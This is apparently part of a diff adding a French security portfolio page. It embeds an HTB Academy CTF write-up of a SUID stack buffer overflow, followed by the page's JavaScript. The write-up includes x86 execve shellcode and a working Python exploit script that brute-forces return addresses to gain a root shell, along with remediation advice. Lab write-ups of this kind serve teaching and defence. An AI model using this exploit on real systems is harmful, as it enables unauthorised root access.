+   gdb -q -batch -ex "set disable-randomization on" \
+       -ex "break *(leavemsg+0x6d)" \
+       -ex "run \$(python2 -c 'print chr(0x90)*2064')" \
+       -ex "print/x \$ebp-0x808" ./leave_msg
+   # tampon (sous gdb) = 0xffffcbe0 ; adresse réelle légèrement plus haute
+   ```
+
+3. **Construire le payload** `NOP sled + shellcode + adresse de retour` :
+   - Shellcode `execve("/bin/sh")` x86, **null-free** (23 octets) :
+     ```
+     \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+     \x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+     ```
+   - Disposition (2064 octets) : `[NOP × 2037][shellcode 23o][adresse de retour 4o]`
+     → l'adresse de retour (offset 2060) pointe dans le NOP sled, qui « glisse »
+     jusqu'au shellcode.
+
+4. **Contrainte octet nul** : l'adresse de retour transite par `argv[1]`, une chaîne C
+   **null-terminée** → **aucun octet de l'adresse ne doit valoir `0x00`**
+   (ex. `0xffffd800` → `\x00\xd8\xff\xff` est invalide et tronque l'argument).
+   On bruteforce donc uniquement des adresses sans octet nul, le large NOP sled
+   absorbant l'imprécision gdb vs exécution réelle.
+
+5. **Exploit (script `python2` exécuté sur la cible)** — pipe les commandes dans le
+   shell root obtenu :
+   ```python
+   import subprocess, struct, sys
+   sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+         "\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
+   base = "\x90"*(2060-len(sc)) + sc
+   hasnull = lambda a: any(((a>>s)&0xff)==0 for s in (0,8,16,24))
+   for addr in range(0xffffdf00, 0xffffc400, -0x10):
+       if hasnull(addr):
+           continue
+       payload = base + struct.pack("<I", addr)
+       p = subprocess.Popen(["./leave_msg", payload], stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+       out, _ = p.communicate("id; cat /root/flag.txt\n")
+       if "uid=0" in out:
+           sys.stdout.write("WIN addr=%#x\n%s" % (addr, out))
+           break
+   ```
+
+#### Preuve
+
+```
+WIN addr=0xffffddf0
+uid=0(root) gid=1001(htb-student) groups=1001(htb-student)
+HTB{wmcaJe4************************}        # flag tronqué
+```
+
+> **Flag complet** récupéré sur la cible (conservé hors rapport).
+> Adresse de retour gagnante : **`0xffffddf0`** (dans le NOP sled).
+
+#### Impact
+
+Un utilisateur local non privilégié obtient un **shell root complet** et donc le contrôle
+total de l'hôte : lecture/écriture de tous les fichiers (y compris `/root/flag.txt`,
+`/etc/shadow`), persistance, pivot. L'overflow est **fiable et répétable** grâce à
+l'absence de protections mémoire.
+
+#### Remédiation
+
+1. **Supprimer le bit SUID** s'il n'est pas indispensable :
+   `chmod u-s /home/htb-student/leave_msg` (et ne jamais laisser de binaire SUID
+   inédit dans un home utilisateur).
+2. **Corriger la copie non bornée** : remplacer `strcpy(buf, arg)` par une copie bornée
+   `strncpy(buf, arg, sizeof(buf)-1); buf[sizeof(buf)-1]='\0';` (ou `snprintf`),
+   et valider la longueur de `argv[1]`.
+3. **Recompiler avec les protections** :
+   - `-fstack-protector-all` (stack canaries),
+   - `-z noexecstack` (pile non exécutable / NX),
+   - `-pie -fPIE` (ASLR sur l'exécutable),
+   - `-D_FORTIFY_SOURCE=2 -O2` (durcissement libc),
+   - `-Wl,-z,relro,-z,now` (GOT en lecture seule).
+4. **Réactiver l'ASLR système** : `echo 2 > /proc/sys/kernel/randomize_va_space`
+   (ou `kernel.randomize_va_space = 2` dans `/etc/sysctl.conf`).
+5. **Principe de moindre privilège** : si une action root est nécessaire, passer par un
+   service dédié avec interface minimale et validée, pas par un binaire SUID monolithique.
+
+---
+
+## 4. Findings secondaires (durcissement — criticité basse)
+
+- **[BAS] ASLR désactivé sur l'hôte** (`randomize_va_space=0`) : rend toute exploitation
+  mémoire déterministe. → remettre à `2`.
+- **[BAS] Binaire SUID root dans un répertoire utilisateur** : surface d'attaque anormale ;
+  à proscrire par politique.
+
+---
+
+## 5. Leçons / réutilisable
+
+- **Toujours identifier l'entrée réellement contrôlée** : ici `argv[1]`, pas le fichier
+  manipulé par le programme (`msg.txt` n'était qu'un leurre/sortie).
+- **Un `setresuid(0,0,0)` en amont** de la fonction vulnérable = exécuter du code suffit,
+  pas besoin d'ajouter un `setuid` dans le shellcode.
+- **Checklist protections avant d'exploiter** : `randomize_va_space`, `readelf -l` (RWE),
+  présence de canary, PIE. Ici tout est ouvert → shellcode sur pile.
+- **Offset = taille tampon + alignement jusqu'à l'adresse de retour** : `ebp-0x808` → 2060.
+- **Contrainte octet nul sur l'adresse de retour** (chaîne C via `argv`) : filtrer les
+  adresses contenant `0x00`, et s'appuyer sur un **grand NOP sled** pour absorber l'écart
+  d'adresse entre `gdb` et l'exécution réelle (environnement/argv différents).
+
+---
+
+*Rapport généré pour un test d'intrusion / exercice CTF autorisé (HTB Academy).*
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/12.0.2/marked.min.js"></script>
+<script>
+(function(){
+  "use strict";
+  var CATS = [["method", "Méthodologie & démarche", "01"], ["recon", "Reconnaissance & OSINT", "02"], ["web", "Sécurité web & API", "03"], ["access", "Exploitation & post-exploitation", "04"]][];
+  var catName={}; CATS.forEach(function(c){catName[c[0]]=c[1];});
+  marked.setOptions({gfm:true,breaks:false,headerIds:false,mangle:false});
+
+  /* theme */
+  var root=document.documentElement, moon=document.getElementById('icoMoon'), sun=document.getElementById('icoSun');
+  function prefDark(){return window.matchMedia&&window.matchMedia('(prefers-color-scheme:dark)').matches;}
+  function isDark(){var t=root.getAttribute('data-theme');return t?t==='dark':prefDark();}
+  function paint(){var d=isDark();moon.hidden=d;sun.hidden=!d;}
+  try{var s=localStorage.getItem('mm-theme');if(s)root.setAttribute('data-theme',s);}catch(e){}
+  paint();
+  document.getElementById('themeBtn').addEventListener('click',function(){
+    var n=isDark()?'light':'dark';root.setAttribute('data-theme',n);try{localStorage.setItem('mm-theme',n);}catch(e){}paint();
+  });
+
+  /* shared: enhance rendered markdown */
+  function sel(node){try{var r=document.createRange();r.selectNodeContents(node);var s=window.getSelection();s.removeAllRanges();s.addRange(r);}catch(e){}}
+  function enhance(scope){
+    [].slice.call(scope.querySelectorAll('pre > code')).forEach(function(code){
+      if(code.parentNode.parentNode.classList.contains('codewrap'))return;
+      var pre=code.parentNode, lang='shell', cl=(code.className||'').match(/language-([\w-]+)/); if(cl)lang=cl[1];
+      var wrap=document.createElement('div');wrap.className='codewrap';
+      var bar=document.createElement('div');bar.className='cbar';bar.innerHTML='<span class="lang">'+lang+'</span>';
+      var btn=document.createElement('button');btn.type='button';btn.className='copy';
+      var ic='<svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h8"/></svg> copier';
+      btn.innerHTML=ic;
+      btn.addEventListener('click',function(){
+        function ok(){btn.classList.add('done');btn.innerHTML='✓ copié';setTimeout(function(){btn.classList.remove('done');btn.innerHTML=ic;},1400);}
+        var t=code.textContent;
+        if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(t).then(ok,function(){sel(code);});else sel(code);
+      });
+      bar.appendChild(btn);
+      pre.parentNode.insertBefore(wrap,pre);wrap.appendChild(bar);wrap.appendChild(pre);
+    });
+    [].slice.call(scope.querySelectorAll('table')).forEach(function(tb){
+      if(tb.parentNode.classList.contains('tablewrap'))return;
+      var w=document.createElement('div');w.className='tablewrap';tb.parentNode.insertBefore(w,tb);w.appendChild(tb);
+    });
+  }
+
+  /* gather notes */
+  var srcs=[].slice.call(document.querySelectorAll('.note-src'));
+  var store={}; srcs.forEach(function(sc){store[sc.getAttribute('data-id')]=sc;});
+
+  /* write-up (realisation) */
+  var wuToggle=document.getElementById('wuToggle'), wuBody=document.getElementById('wuBody'), wuRendered=false;
+  wuToggle.addEventListener('click',function(){
+    var open=wuBody.hidden;
+    if(open&&!wuRendered){
+      var md=wuBody.querySelector('.md');md.innerHTML=marked.parse(store['nixbof32'].textContent);enhance(md);wuRendered=true;
+    }
+    wuBody.hidden=!open;wuToggle.setAttribute('aria-expanded',String(open));
+    wuToggle.querySelector('span').textContent=open?'Masquer le write-up':'Lire le write-up complet';
+  });
+
+  /* knowledge base cards (exclude nixbof32) */
+  var kb=document.getElementById('kb'), cards=[];
+  srcs.filter(function(sc){return sc.getAttribute('data-cat')!=='writeup';}).forEach(function(sc,i){
+    var id=sc.getAttribute('data-id'),title=sc.getAttribute('data-title'),cat=sc.getAttribute('data-cat'),
+        desc=sc.getAttribute('data-desc'),tags=(sc.getAttribute('data-tags')||'').split(',').filter(Boolean),
+        cmds=sc.getAttribute('data-cmds');
+    var card=document.createElement('div');card.className='card';card.dataset.cat=cat;
+    var head=document.createElement('button');head.type='button';head.className='card-head';head.setAttribute('aria-expanded','false');
+    head.innerHTML='<span class="card-idx">'+String(i+1).padStart(2,'0')+'</span>'+
+      '<span class="card-main"><span class="t">'+title+'</span><span class="d">'+desc+'</span>'+
+      '<span class="card-meta">'+tags.map(function(t){return '<span class="tag">'+t+'</span>';}).join('')+
+      '<span class="cmds">'+cmds+' cmd</span></span></span>'+
+      '<span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span>';
+    var body=document.createElement('div');body.className='card-body';
+    var inner=document.createElement('div');inner.className='inner md';body.appendChild(inner);
+    var rendered=false;
+    head.addEventListener('click',function(){
+      var open=!card.classList.contains('open');
+      if(open&&!rendered){inner.innerHTML=marked.parse(sc.textContent);enhance(inner);rendered=true;}
+      card.classList.toggle('open',open);head.setAttribute('aria-expanded',String(open));
+    });
+    card.appendChild(head);card.appendChild(body);kb.appendChild(card);
+    cards.push({el:card,cat:cat,text:(title+' '+desc+' '+tags.join(' ')+' '+sc.textContent).toLowerCase()});
+  });
+
+  /* filters */
+  var filters=document.getElementById('filters'), activeCat='all', q=document.getElementById('q'), nores=document.getElementById('noresult');
+  function mkFilt(key,label){var b=document.createElement('button');b.className='filt'+(key==='all'?' on':'');b.textContent=label;b.dataset.key=key;
+    b.addEventListener('click',function(){activeCat=key;[].forEach.call(filters.children,function(c){c.classList.toggle('on',c.dataset.key===key);});apply();});
+    filters.appendChild(b);}
+  mkFilt('all','Tout');
+  CATS.forEach(function(c){ if(cards.some(function(k){return k.cat===c[0];})) mkFilt(c[0],c[1]); });
+  function apply(){
+    var v=q.value.trim().toLowerCase(), terms=v.split(/\s+/).filter(Boolean), shown=0;
+    cards.forEach(function(k){
+      var okCat=activeCat==='all'||k.cat===activeCat;
+      var okTxt=terms.every(function(t){return k.text.indexOf(t)>=0;});
+      var ok=okCat&&okTxt;k.el.hidden=!ok;if(ok)shown++;
+    });
+    nores.classList.toggle('on',shown===0);
+  }
+  var tmr;q.addEventListener('input',function(){clearTimeout(tmr);tmr=setTimeout(apply,90);});
+  q.addEventListener('keydown',function(e){if(e.key==='Escape'){q.value='';apply();}});
+
+  /* copy email */
+  var mailBtn=document.getElementById('mailBtn');
+  mailBtn.addEventListener('click',function(){
+    var mail='meunier.maxence16@gmail.com';
+    function ok(){mailBtn.classList.add('done');var old=mailBtn.childNodes;mailBtn.lastChild.textContent='adresse copiée ✓';setTimeout(function(){mailBtn.classList.remove('done');mailBtn.lastChild.textContent=mail;},1500);}
+    if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(mail).then(ok,function(){});
+  });
+
+  /* nav: scrollspy + mobile */
+  var nav=document.getElementById('nav'), navA=[].slice.call(nav.querySelectorAll('a')), secs=navA.map(function(a){return document.querySelector(a.getAttribute('href'));});
+  var spy=new IntersectionObserver(function(ents){
+    ents.forEach(function(en){if(en.isIntersecting){var id='#'+en.target.id;navA.forEach(function(a){a.classList.toggle('active',a.getAttribute('href')===id);});}});
+  },{rootMargin:'-45% 0px -50% 0px',threshold:0});
+  secs.forEach(function(s){if(s)spy.observe(s);});
+  var menuBtn=document.getElementById('menuBtn');
+  menuBtn.addEventListener('click',function(){
+    var on=nav.classList.toggle('mobile');menuBtn.setAttribute('aria-expanded',String(on));
+  });
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A'){nav.classList.remove('mobile');menuBtn.setAttribute('aria-expanded','false');}});
+})();
+</script>
